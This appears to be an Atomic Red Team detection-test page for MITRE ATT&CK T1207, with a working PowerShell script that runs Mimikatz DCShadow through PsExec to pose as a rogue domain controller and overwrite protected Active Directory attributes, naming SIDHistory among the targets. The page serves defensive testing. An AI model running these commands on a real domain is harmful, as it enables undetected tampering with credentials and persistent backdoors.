# T1207 - Rogue Domain Controller
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1207)
<blockquote>Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.

## Atomic Tests

- [Atomic Test #1 - DCShadow - Mimikatz](#atomic-test-1---dcshadow---mimikatz)


<br/>

## Atomic Test #1 - DCShadow - Mimikatz
Use Mimikatz DCShadow method to simulate behavior of a Domain Controller and edit protected attribute.

[DCShadow](https://www.dcshadow.com/)
[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)

It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount

Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
The easiest is to run elevated and as a Domain Admin user.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| object | Targeted object (for machine account do not forget to add final '$') | string | bruce.wayne|
| attribute | Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory... | string | badpwdcount|
| value | Value to assign to object attribute | string | 9999|
| mimikatz_path | Mimikatz windows executable | path | $env:TEMP&#92;mimikatz&#92;x64&#92;mimikatz.exe|
| psexec_path | Path to PsExec | string | C:&#92;PSTools&#92;PsExec.exe|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
# starting fake DC server, as SYSTEM (required)
$dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& #{mimikatz_path} "lsadump::dcshadow /push" "exit"

Write-Host "`nWaiting for fake DC server to return"
Wait-Process $dc

Write-Host "`nOutput from fake DC server:"
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host "End of DCShadow"
```

#### Cleanup Commands:
```powershell
Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
```
